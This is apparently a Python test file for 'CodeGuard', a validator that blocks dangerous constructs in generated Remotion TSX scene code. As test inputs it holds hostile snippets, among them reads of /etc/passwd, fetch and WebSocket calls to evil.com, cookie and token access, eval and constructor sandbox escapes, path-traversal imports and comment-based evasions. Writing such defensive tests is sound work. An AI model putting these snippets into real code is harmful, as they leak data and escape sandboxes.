from __future__ import annotations

from pathlib import Path

from packages.core.media.codeguard import CodeGuard, CodeGuardResult


def test_codeguard_permits_safe_remotion_tsx() -> None:
    safe_code = """
    import React from 'react';
    import { useCurrentFrame, interpolate, spring } from 'remotion';
    import { ObjectStage } from '../../../video/src/art/Stage';

    export const Scene01: React.FC = () => {
        const frame = useCurrentFrame();
        const opacity = interpolate(frame, [0, 15], [0, 1], { extrapolateRight: 'clamp' });
        return <div style={{ opacity }}>Hello Causal Motion</div>;
    };
    """
    guard = CodeGuard()
    result = guard.validate_source(safe_code)
    assert isinstance(result, CodeGuardResult)
    assert result.valid is True
    assert len(result.issues) == 0
    assert "remotion" in result.imported_modules


def test_codeguard_blocks_forbidden_imports() -> None:
    dangerous_code = """
    import React from 'react';
    import * as fs from 'fs';
    import { exec } from 'child_process';

    export const MaliciousScene: React.FC = () => {
        fs.readFileSync('/etc/passwd');
        return <div>Hacked</div>;
    };
    """
    guard = CodeGuard()
    result = guard.validate_source(dangerous_code)
    assert result.valid is False
    assert any("fs" in issue for issue in result.issues)
    assert any("child_process" in issue for issue in result.issues)


def test_codeguard_blocks_eval_and_fetch() -> None:
    sneaky_code = """
    import React from 'react';
    export const Sneaky: React.FC = () => {
        eval("console.log('danger')");
        fetch('https://evil.com/leak');
        return <div>Bad</div>;
    };
    """
    guard = CodeGuard()
    result = guard.validate_source(sneaky_code)
    assert result.valid is False
    assert any("eval" in issue.lower() for issue in result.issues)
    assert any("fetch" in issue.lower() for issue in result.issues)


def test_codeguard_scans_directory(tmp_path: Path) -> None:
    (tmp_path / "Scene1.tsx").write_text(
        "import React from 'react'; export const S = () => <div>Safe</div>;", encoding="utf-8"
    )
    (tmp_path / "Bad.tsx").write_text("import fs from 'fs';", encoding="utf-8")
    guard = CodeGuard()
    result = guard.validate_directory(tmp_path)
    assert result.valid is False
    assert any("fs" in issue for issue in result.issues)


def test_codeguard_comment_bypass_attempts() -> None:
    guard = CodeGuard()

    # Block comment inside import statement
    code_import = "import * as fs from/**/'fs';"
    res_import = guard.validate_source(code_import)
    assert res_import.valid is False
    assert any("Disallowed import: fs" in issue for issue in res_import.issues)
    assert "fs" in res_import.imported_modules

    # Block comment inside eval invocation
    code_eval = 'eval/*safe*/("bad");'
    res_eval = guard.validate_source(code_eval)
    assert res_eval.valid is False
    assert any("eval" in issue.lower() for issue in res_eval.issues)


def test_codeguard_comment_stripping_preserves_strings_and_ignores_commented_code() -> None:
    guard = CodeGuard()

    # Commented-out dangerous calls should NOT trigger issues, strings with comment chars should be preserved
    code_commented = """
    // eval("bad");
    // import * as fs from 'fs';
    /*
       fetch('https://evil.com');
       window.fetch('https://evil.com');
    */
    import React from 'react';
    export const Safe: React.FC = () => {
        const url = "https://example.com/api"; // URL with // inside string
        const note = "/* not a comment */";
        return <div>{url} - {note}</div>;
    };
    """
    res = guard.validate_source(code_commented)
    assert res.valid is True
    assert len(res.issues) == 0
    assert res.imported_modules == ["react"]


def test_codeguard_blocks_path_traversal_and_absolute_imports() -> None:
    guard = CodeGuard()

    # /etc/passwd absolute import
    code_abs = "import * as sec from '/etc/passwd';"
    res_abs = guard.validate_source(code_abs)
    assert res_abs.valid is False
    assert any("Disallowed import: /etc/passwd" in issue for issue in res_abs.issues)

    # Windows drive absolute import
    code_win = "import cmd from 'C:/Windows/System32/cmd.exe';"
    res_win = guard.validate_source(code_win)
    assert res_win.valid is False
    assert any("Disallowed import: C:/Windows/System32/cmd.exe" in issue for issue in res_win.issues)

    # Path traversal in @remotion subpath
    code_rem_trav = "import { evil } from '@remotion/../../child_process';"
    res_rem_trav = guard.validate_source(code_rem_trav)
    assert res_rem_trav.valid is False
    assert any("Disallowed import: @remotion/../../child_process" in issue for issue in res_rem_trav.issues)

    # Path traversal in packages/video/src/...
    code_pkg_trav = "import { evil } from 'packages/video/src/../../malicious';"
    res_pkg_trav = guard.validate_source(code_pkg_trav)
    assert res_pkg_trav.valid is False
    assert any(
        "Disallowed import: packages/video/src/../../malicious" in issue for issue in res_pkg_trav.issues
    )

    # Chained traversal escaping after video/src
    code_esc_video = "import * as sec from '../../../video/src/../../etc/passwd';"
    res_esc_video = guard.validate_source(code_esc_video)
    assert res_esc_video.valid is False
    assert any("Disallowed import" in issue for issue in res_esc_video.issues)

    # Substring evasion like video/src_evil
    code_sub_evil = "import * as sec from '../video/src_evil/payload';"
    res_sub_evil = guard.validate_source(code_sub_evil)
    assert res_sub_evil.valid is False
    assert any("Disallowed import" in issue for issue in res_sub_evil.issues)

    # Relative path escaping into forbidden directories (config, node_modules, secrets)
    code_esc_config = "import * as cfg from '../../../../config/studio.json';"
    res_esc_config = guard.validate_source(code_esc_config)
    assert res_esc_config.valid is False
    assert any("Disallowed import" in issue for issue in res_esc_config.issues)

    code_esc_nm = "import * as cp from './node_modules/child_process';"
    res_esc_nm = guard.validate_source(code_esc_nm)
    assert res_esc_nm.valid is False
    assert any("Disallowed import" in issue for issue in res_esc_nm.issues)

    # Relative path with null byte
    code_null = "import mod from './foo\0bar';"
    res_null = guard.validate_source(code_null)
    assert res_null.valid is False
    assert any("Disallowed import" in issue for issue in res_null.issues)


def test_codeguard_blocks_prohibited_tokens() -> None:
    guard = CodeGuard()

    prohibited_snippets: list[tuple[str, str]] = [
        ("window.fetch('https://evil.com')", "window.fetch"),
        ("window['fetch']('https://evil.com')", "window.fetch"),
        ("window[`fetch`]()", "window.fetch"),
        ("localStorage.getItem('token')", "localStorage"),
        ("sessionStorage.setItem('key', 'val')", "sessionStorage"),
        ("document.cookie = 'auth=token'", "document.cookie"),
        ("document['cookie'] = 'auth=token'", "document.cookie"),
        ("document[`cookie`] = 'auth=token'", "document.cookie"),
        ("Function('return this')()", "Function()"),
        ("(0, Function)('return this')()", "Function()"),
        ("process.exit(1)", "process"),
        ("eval`malicious_code`", "eval"),
        ("(0, eval)('malicious')", "eval"),
        ("(0, fetch)('https://evil.com')", "fetch()"),
        ("const req = require; req('fs')", "require"),
        ('\'\'.constructor.constructor("return process")()', "constructor access"),
        ("obj['constructor']", "constructor access"),
        ("obj[`constructor`]", "constructor access"),
        ('obj["constructor"]', "constructor access"),
        ("const dyn = import('./dynamic')", "dynamic import()"),
        ("const req = require('remotion')", "require"),
        ("new XMLHttpRequest()", "XMLHttpRequest"),
        ("new WebSocket('ws://evil.com')", "WebSocket"),
        ("globalThis.leak = 1", "globalThis"),
        ("global.leak = 1", "global"),
    ]

    for snippet, expected_token in prohibited_snippets:
        source = f"import React from 'react'; export const Scene = () => {{ {snippet}; return null; }};"
        res = guard.validate_source(source)
        assert res.valid is False, f"Expected snippet to be blocked: {snippet}"
        assert any(expected_token in issue for issue in res.issues), (
            f"Expected {expected_token!r} in issues for {snippet!r}, got: {res.issues}"
        )


def test_codeguard_permits_safe_tsx_full_suite() -> None:
    safe_tsx = """
    import React from 'react';
    import { useCurrentFrame, interpolate, spring } from 'remotion';
    import { ObjectStage } from '../../../video/src/art/Stage';
    import { Header } from './components/Header';
    import type { SceneProps } from 'packages/video/src/types';
    export { Scene01 } from './Scene01';

    export const SafeScene: React.FC<SceneProps> = () => {
        const frame = useCurrentFrame();
        const opacity = interpolate(frame, [0, 30], [0, 1], { extrapolateRight: 'clamp' });
        const scale = spring({ frame, fps: 30, config: { damping: 10 } });
        return (
            <ObjectStage>
                <div style={{ opacity, transform: `scale(${scale})` }}>
                    <Header title="Welcome" />
                </div>
            </ObjectStage>
        );
    };
    """
    guard = CodeGuard()
    res = guard.validate_source(safe_tsx)
    assert res.valid is True
    assert len(res.issues) == 0
    assert "react" in res.imported_modules
    assert "remotion" in res.imported_modules
    assert "../../../video/src/art/Stage" in res.imported_modules
    assert "./components/Header" in res.imported_modules
    assert "packages/video/src/types" in res.imported_modules
    assert "./Scene01" in res.imported_modules


def test_codeguard_validate_directory_string_and_nonexistent(tmp_path: Path) -> None:
    guard = CodeGuard()

    # Valid directory via str
    (tmp_path / "Scene1.tsx").write_text(
        "import React from 'react'; export const S = () => null;", encoding="utf-8"
    )
    res_str = guard.validate_directory(str(tmp_path))
    assert res_str.valid is True
    assert res_str.imported_modules == ["react"]

    # Non-existent directory via str
    res_missing_str = guard.validate_directory(str(tmp_path / "does_not_exist"))
    assert res_missing_str.valid is False
    assert any("does not exist" in issue for issue in res_missing_str.issues)

    # Non-existent directory via Path
    res_missing_path = guard.validate_directory(tmp_path / "missing_dir")
    assert res_missing_path.valid is False
    assert any("does not exist" in issue for issue in res_missing_path.issues)


def test_codeguard_validate_file_safe_and_malicious(tmp_path: Path) -> None:
    guard = CodeGuard()

    safe_file = tmp_path / "Safe.tsx"
    safe_file.write_text("import React from 'react'; export const Safe = () => <div>OK</div>;", encoding="utf-8")

    malicious_file = tmp_path / "Malicious.tsx"
    malicious_file.write_text("import React from 'react'; process.exit(1);", encoding="utf-8")

    # Safe file with Path and str
    res_safe_path = guard.validate_file(safe_file)
    assert res_safe_path.valid is True
    assert len(res_safe_path.issues) == 0

    res_safe_str = guard.validate_file(str(safe_file))
    assert res_safe_str.valid is True
    assert len(res_safe_str.issues) == 0

    # Malicious file with Path and str
    res_bad_path = guard.validate_file(malicious_file)
    assert res_bad_path.valid is False
    assert any("process" in issue for issue in res_bad_path.issues)

    res_bad_str = guard.validate_file(str(malicious_file))
    assert res_bad_str.valid is False
    assert any("process" in issue for issue in res_bad_str.issues)

    # Non-existent file
    res_missing = guard.validate_file(tmp_path / "non_existent.tsx")
    assert res_missing.valid is False
    assert any("does not exist" in issue for issue in res_missing.issues)
